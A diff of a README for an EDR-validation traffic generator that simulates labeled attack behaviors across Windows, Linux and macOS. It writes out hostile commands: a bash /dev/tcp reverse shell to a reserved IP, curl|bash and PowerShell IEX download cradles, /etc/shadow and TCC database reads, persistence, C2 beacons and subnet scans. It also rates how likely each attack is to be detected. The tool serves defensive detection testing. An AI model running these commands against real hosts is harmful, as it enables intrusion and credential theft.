@@ -1,7 +1,8 @@
-# SentinelOne Traffic Generator — Setup & Usage Guide
+# Endpoint Traffic Generator — Setup & Usage Guide
 
-Simulates realistic endpoint activity for validating SentinelOne agent
-detection coverage. Runs two categories of activity on a configurable schedule:
+Simulates realistic endpoint activity for validating EDR detection coverage
+(SentinelOne, CrowdStrike, or any agent-based EDR). Runs two categories of
+activity on a configurable schedule:
 
 - **Normal traffic** — web browsing, DNS lookups, file I/O, SMTP probes
 - **Attack simulations** — clearly labeled `[TEST-ATTACK]` behaviors that
@@ -109,6 +110,10 @@ python3 traffic_generator.py --runtime 3600 --log-file sim.log
 | `--attack-interval SEC` | `300` | Seconds between attack simulation windows |
 | `--attack-prob 0-1` | `0.4` | Probability an attack fires each window (0 = never, 1 = always) |
 | `--runtime SEC` | *(run forever)* | Stop automatically after this many seconds |
+| `--beacon` | off | Enable background C2 beacon simulation |
+| `--beacon-host IP` | `192.0.2.100` | Beacon target host (RFC 5737 reserved IP by default) |
+| `--beacon-port PORT` | `4444` | Beacon target port |
+| `--beacon-interval SEC` | `60` | Seconds between beacon check-ins |
 | `--log-file PATH` | *(stdout only)* | Also write logs to this file |
 | `--verbose` | — | Show DEBUG-level output |
 
@@ -121,7 +126,7 @@ then prints the detected profile at startup:
 
 ```
 OS profile      : rhel  (Linux-5.14.0-x86_64-with-glibc2.28)
-Attack pool     : 13 actions
+Attack pool     : 27 actions
 ```
 
 | Detected value | Covers |
@@ -183,6 +188,7 @@ so they are easy to filter in a SIEM or log file.
 | Scheduled task | `schtasks /create` then `/delete` — persistence attempt with cleanup |
 | VSS / backup recon | `vssadmin list shadows`, `wbadmin get status`, `bcdedit /enum` — ransomware pre-stage pattern |
 | LSASS handle request | `OpenProcess(PROCESS_ALL_ACCESS)` on the LSASS PID — credential dumping precursor |
+| PowerShell IEX | `IEX (New-Object Net.WebClient).DownloadString(url)` — Invoke-Expression is the most-signatured PS technique |
 
 #### RHEL / CentOS
 
@@ -190,12 +196,18 @@ so they are easy to filter in a SIEM or log file.
 |---|---|
 | Bash recon chain | 9-command recon chain via `bash -c` — creates suspicious `python→bash→tools` process tree |
 | Bash encoded command | `bash -c "$(echo <base64> \| base64 -d)"` — Linux obfuscation equivalent |
+| curl\|bash cradle | `curl URL \| bash` — the single most-flagged Linux download-and-exec pattern |
 | curl/wget download cradle | Downloads from a safe echo endpoint to simulate payload retrieval |
+| Reverse shell simulation | `bash -i >& /dev/tcp/192.0.2.100/4444 0>&1` — most common post-exploitation technique, heavily signatured |
 | /etc/shadow read | Actually `open()`s `/etc/shadow` — generates credential-access telemetry |
 | SUID binary search | `find /usr -perm -4000` — standard privilege escalation recon |
+| sudo recon | `sudo -l` / `cat /etc/sudoers` — first-step privilege enumeration after shell access |
 | Cron persistence | Writes a test crontab entry then removes it immediately |
+| systemd persistence | Writes a user-level `.service` unit, enables it, disables it, removes it |
 | ptrace attempt | `ptrace(PTRACE_ATTACH, 1)` on init/systemd — process injection precursor |
 | Directory traversal | Lists `/etc`, `/var/log`, `/root`, `~/.ssh`, `/tmp` |
+| /proc access | Opens `/proc/1/maps`, `/proc/1/cmdline`, `/proc/1/environ` — memory recon pattern |
+| nmap subnet scan | Runs `nmap --top-ports 20` against local /24 — uses the actual binary, much more detectable than raw sockets |
 | rpm -Va integrity check | Verifies package file integrity — used to find tampered binaries |
 | yum/dnf package recon | Lists all installed packages via yum or dnf |
 
@@ -214,13 +226,19 @@ Same as RHEL, plus:
 |---|---|
 | Bash recon chain | Multi-command recon via `bash -c` intermediary |
 | Bash encoded command | Same base64 decode+exec technique as Linux |
+| curl\|bash cradle | `curl URL \| bash` — top-flagged download-and-exec pattern |
 | curl download cradle | Simulates payload retrieval |
-| /etc/shadow read | Actually opens `/etc/shadow` — generates credential-access telemetry |
+| Reverse shell simulation | `bash -i >& /dev/tcp/192.0.2.100/4444 0>&1` |
 | SUID binary search | Scans `/usr` for setuid binaries |
+| sudo recon | `sudo -l` / `cat /etc/sudoers` |
+| nmap subnet scan | Runs `nmap --top-ports 20` against local /24 |
 | Directory traversal | Lists sensitive directories |
 | Keychain access | `security list-keychains` and `find-generic-password` |
 | LaunchAgent persistence | Writes and loads a test `.plist`, then immediately unloads and deletes it |
 | macOS-specific recon | `dscl`, `networksetup`, `system_profiler`, `defaults read` |
+| TCC database access | Opens `~/Library/Application Support/com.apple.TCC/TCC.db` — app permission database |
+| Gatekeeper recon | `spctl --status`, `codesign --verify`, `csrutil status` — security posture enumeration |
+| osascript execution | AppleScript via `osascript` — used for persistence and privilege escalation |
 
 ---
 
@@ -277,6 +295,63 @@ grep "TEST-ATTACK" sim.log
 
 ---
 
+## End-of-Run Attack Summary
+
+When the generator stops — either via `Ctrl+C` or when `--runtime` expires —
+it prints a formatted attack summary showing every attack that fired, its
+timestamp, and whether any EDR impediment signals were detected.
+
+```
+================================================================================
+  END-OF-RUN ATTACK SUMMARY
+================================================================================
+  Run time : 00:18:42  |  Attacks fired : 7
+--------------------------------------------------------------------------------
+  TIME      ATTACK                                     IMPEDED?   NOTES
+  --------------------------------------------------------------------------
+  12:23:01  attack_eicar_drop                          YES <<<    EICAR file deleted by AV/EDR before script cleanup
+  12:25:44  attack_recon_commands                      no
+  12:28:11  attack_credential_read                     no
+  12:30:57  attack_bash_chain                          no
+  12:33:22  attack_reverse_shell_sim                   YES <<<    subprocess killed (SIGKILL): bash
+  12:36:05  attack_dga_dns                             no
+  12:38:49  attack_port_scan_localhost                 no
+
+  PASSIVE ATTACKS — low EDR signal, consider removing from rotation:
+  --------------------------------------------------------------------------
+  attack_port_scan_localhost                loopback only — no lateral movement signal
+================================================================================
+```
+
+### What counts as "impeded"
+
+| Signal | What triggered it |
+|---|---|
+| `EICAR file deleted by AV/EDR` | EICAR file disappeared before the script's own cleanup — agent deleted it |
+| `subprocess killed (SIGKILL)` | A subprocess returned `rc=-9` — process was terminated by the agent |
+
+### Passive attack notes
+
+Attacks flagged as passive are low-signal by design. They rarely trigger alerts
+on their own but contribute to behavioral correlation. The summary lists any that
+fired so you can decide whether to keep them based on your environment.
+
+| Attack | Why it's passive |
+|---|---|
+| `attack_credential_file_access` | Uses `os.path.exists()` — no file-read syscall |
+| `attack_port_scan_localhost` | Loopback only — no lateral movement signal |
+| `attack_sensitive_dir_traversal` | Plain `ls` — no access violation |
+| `attack_windows_registry_enum` | Read-only `reg query` — no write event |
+| `attack_rpm_verify` | Package integrity check — passive enumeration |
+| `attack_yum_recon` | `dnf/yum list` — passive package enumeration |
+| `attack_dpkg_recon` | `dpkg -l` — passive package enumeration |
+| `attack_gatekeeper_recon` | `spctl/csrutil` queries — read-only status checks |
+| `attack_macos_recon` | Info-gathering commands — no access violation |
+
+The summary is also written to `--log-file` if one is configured.
+
+---
+
 ## Tuning for Your Environment
 
 **Light background noise, rare attacks** (default — blends in, tests passive detection):
@@ -298,6 +373,81 @@ python3 traffic_generator.py --normal-interval 15 --attack-interval 60 --attack-
 ```bash
 python3 traffic_generator.py --attack-prob 0
 ```
+
+---
+
+## Detection Confidence by OS
+
+Not all attacks are equally likely to trigger an alert. This table reflects
+expected behaviour on default EDR policies — tuned environments will catch more.
+
+### Windows
+
+| Attack | Confidence | Notes |
+|---|---|---|
+| EICAR drop / multi-drop | High | Triggers if real-time protection is on |
+| PowerShell IEX | High | Most-signatured PS technique |
+| PowerShell encoded command | High | First-class detection rule on both S1 and CRWD |
+| LSASS handle request | High | Even a denied attempt registers as credential access |
+| VSS / backup recon | High | Exact ransomware pre-stage pattern |
+| CMD recon chain | High | Suspicious process tree triggers behavioral AI |
+| Registry / scheduled task persistence | High | Write-then-delete still fires the creation event |
+| LOLBAS (mshta, wscript, rundll32, certutil) | Medium–High | Depends on LOLBin policy |
+| External C2 connections | Medium | Requires network visibility add-on |
+| DGA DNS burst | Medium | Requires DNS monitoring to be enabled |
+
+### RHEL / CentOS
+
+| Attack | Confidence | Notes |
+|---|---|---|
+| EICAR drop / multi-drop | High | |
+| `curl \| bash` | High | First-class detection rule on both S1 and CRWD |
+| Reverse shell simulation | High | `bash /dev/tcp` pattern is heavily signatured |
+| `/etc/shadow` read | High | Credential access event even on `PermissionError` |
+| DGA DNS burst | High | Rapid NXDOMAIN pattern |
+| DNS C2 domains | High | Known-bad domain reputation |
+| Bash encoded command | Medium–High | |
+| systemd persistence | Medium–High | |
+| Bash recon chain | Medium | Suspicious process tree |
+| External C2 connections | Medium | Requires network visibility |
+| ptrace attempt | Medium | Requires audit/eBPF visibility |
+| nmap subnet scan | Medium | **Only fires if nmap is installed** — not present by default on CentOS; install with `sudo dnf install nmap` |
+| `/proc/1` access | Medium | Requires file-access monitoring |
+| sudo recon | Low–Medium | Low signal alone; stronger in combination |
+
+### Kali / Debian / Ubuntu
+
+Same as RHEL/CentOS, plus:
+
+| Attack | Confidence | Notes |
+|---|---|---|
+| Offensive tool probe | Medium | Kali will have most tools present — their detection as installed is itself a signal |
+| nmap subnet scan | Medium–High | nmap is installed by default on Kali |
+
+### macOS
+
+| Attack | Confidence | Notes |
+|---|---|---|
+| EICAR drop / multi-drop | High | |
+| `curl \| bash` | High | |
+| Reverse shell simulation | High | |
+| TCC database access | High | macOS-specific, strongly monitored |
+| LaunchAgent persistence | High | |
+| osascript execution | Medium–High | |
+| Gatekeeper / SIP recon | Medium | |
+| Keychain access | Medium | |
+
+---
+
+## Optional Dependencies
+
+Most attacks use only Python standard library. Two attacks use external tools
+if available and silently skip otherwise:
+
+| Tool | Used by | Install |
+|---|---|---|
+| `nmap` | `attack_nmap_scan` | `sudo dnf install nmap` (RHEL/CentOS) · `sudo apt install nmap` (Debian/Kali) · included on Kali |
+| `curl` | `attack_curl_pipe_bash`, `attack_curl_download_cradle` | Included on most distributions; `wget` used as fallback |
 
 ---
 
@@ -337,3 +487,12 @@ agent is protecting LSASS correctly.
 **ptrace attempt shows EPERM**  
 Expected on any system with Yama LSM (`/proc/sys/kernel/yama/ptrace_scope` ≥ 1).
 The attempt still generates an audit event.
+
+**nmap scan skipped on CentOS / RHEL**  
+`nmap` is not installed by default. Install it with `sudo dnf install nmap` to
+enable the subnet scan attack. On Kali it is pre-installed and fires automatically.
+
+**curl|bash or reverse shell sim hangs briefly then continues**  
+Both attacks target RFC 5737 addresses (192.0.2.x) which are never routed — the
+connection will time out after a few seconds. This is expected; the attempt is
+what generates the telemetry, not a successful connection.
